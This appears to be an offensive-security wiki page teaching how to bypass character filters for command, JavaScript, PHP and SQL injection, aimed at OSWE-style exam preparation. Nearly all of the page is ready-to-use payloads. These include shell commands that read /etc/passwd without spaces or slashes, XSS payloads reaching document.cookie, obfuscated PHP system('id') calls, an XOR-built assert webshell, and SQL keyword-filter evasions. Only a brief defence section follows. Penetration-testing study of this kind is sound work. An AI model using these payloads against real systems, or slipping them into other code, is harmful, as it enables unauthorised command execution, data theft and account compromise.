---
title: Character restriction bypass for exploitation
slug: character-restriction-bypass
aliases: [char bypass, character filter bypass, restricted charset exploitation, encoding bypass]
---

> **TL;DR:** When an app filters or limits the character set you can inject, alternative encodings and language-specific tricks let you execute commands and code anyway — hex/octal encoding, template literals, constructor chains, brace expansion, IFS, wildcard globbing, and JSFuck-style encodings all evade character-level restrictions.

## What it is
Applications often restrict input characters to prevent injection — blocking quotes, spaces, semicolons, slashes, or parentheses. Each restriction has known bypasses specific to the execution context (shell, JavaScript, PHP, SQL). Exploiting through character filters is a core OSWE skill.

## Preconditions / where it applies
- Command injection with filtered metacharacters (spaces, semicolons, pipes)
- JavaScript injection with restricted character sets (XSS in constrained contexts)
- PHP injection when specific functions or characters are blocked
- SQL injection through WAFs that strip keywords or punctuation

## Technique

### 1 — Command injection without spaces
Bash treats `$IFS` (Internal Field Separator) as whitespace:

```bash
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}         # brace expansion
cat</etc/passwd           # input redirection as separator
X=$'\x20';cat${X}/etc/passwd  # $'\x20' is a space
```

### 2 — Command injection without slashes
```bash
# use environment variables
cat ${HOME:0:1}etc${HOME:0:1}passwd    # ${HOME:0:1} = /

# use printf
cat $(printf '\x2fetc\x2fpasswd')

# use wildcard globbing
cat /etc/passw?
cat /etc/pass*
```

### 3 — Command injection without common metacharacters
```bash
# without semicolons — use newline %0a or logical operators
id%0awhoami
id&&whoami
id||whoami

# without backticks — use $()
$(whoami)

# without quotes — hex/octal in $'...' or printf
echo $'\x68\x65\x6c\x6c\x6f'          # "hello"
$(printf '\x69\x64')                    # runs "id"

# PHP backtick execution (no exec/system/passthru needed)
`id`                                     # PHP executes shell command
```

### 4 — JavaScript without parentheses
```javascript
// Tagged template literals (ES6) — call functions without ()
alert`1`
setTimeout`alert\x28document.cookie\x29`

// onerror + throw
onerror=alert;throw 1

// constructor chain
[].constructor.constructor('return this')``  // access global
```

### 5 — JavaScript with extremely restricted charset (JSFuck-style)
All JavaScript can be written with `[]()!+`:

```javascript
// Core building blocks
[]        // empty array
![]       // false
!![]      // true
+!![]     // 1
+[]       // 0
[]+[]     // "" (empty string)

// "alert(1)" from 6 characters — use jsfuck.com encoder
// practical payload: bypass WAFs that allow only alphanumeric + []()!+
```

For real-world use, `jsfuck.com` or `JSFuck` encoder generates payloads. Useful when WAFs allow array/boolean syntax.

### 6 — JavaScript constructor chain (no restricted keywords)
```javascript
// access Function constructor without naming it
[]['constructor']['constructor']('alert(1)')()

// string building via array access
'a]b'.split(']')  // ['a','b']

// String.fromCharCode bypass
String.fromCharCode(97,108,101,114,116)  // "alert"
```

### 7 — PHP encoding tricks
```php
// hex-encoded function names (PHP < 8.0 only for some)
"\x73\x79\x73\x74\x65\x6d"("id");      // system("id")

// variable functions
$f = 'system'; $f('id');

// PHP 7+ — ($variable)() calling
('system')('id');

// XOR-based string construction
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // "assert"
$_('%10%11%08%10%09%0e%06%0f'^ '`````````');  // payload

// octal escaping in double-quoted strings
"\163\171\163\164\145\155"("id");        // system("id")
```

### 8 — SQL injection through keyword filters
```sql
-- without spaces
SELECT/**/1/**/FROM/**/users
SELECT(1)FROM(users)WHERE(1=1)

-- without quotes (string building)
SELECT CHAR(97,100,109,105,110)          -- "admin"
SELECT 0x61646d696e                      -- "admin" (MySQL hex)
SELECT x'61646d696e'                     -- SQLite/Postgres

-- without commas (UNION injection)
SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)

-- case and keyword bypass
SeLeCt, SELE/**/CT, %53ELECT
```

### 9 — URL / encoding layers
```
Double encoding:  %2527  →  %27  →  '
Unicode:          %u0027  →  '
Overlong UTF-8:   %c0%a7  →  ' (invalid but some parsers accept)
HTML entities:    &#39; &#x27; &apos;   (in HTML injection contexts)
```

See [[regex-filter-bypass-patterns]] for regex-specific evasion.

## Detection and defence
- Validate against an allowlist of expected characters, not a denylist of dangerous ones
- Use parameterised APIs — parameterised queries (SQL), `execFile` with array args (shell), DOM APIs (JS) — so injection is structurally impossible
- Normalise all encodings to a canonical form **before** validation
- Context-aware output encoding (HTML-encode for HTML, shell-escape for commands)
- WAFs are a defence-in-depth layer, not a replacement for secure coding

See also [[regex-filter-bypass-patterns]], [[command-injection]], [[xss]], [[sql-injection]], [[waf-bypass]].

## References
- [HackTricks — Command injection bypass](https://book.hacktricks.wiki/en/linux-hardening/bypass-bash-restrictions/index.html) — shell restriction bypasses
- [PortSwigger — XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) — JS payloads for restricted contexts
- [PayloadsAllTheThings — Command injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) — comprehensive bypass list
- [JSFuck](http://www.jsfuck.com/) — JS from 6 characters
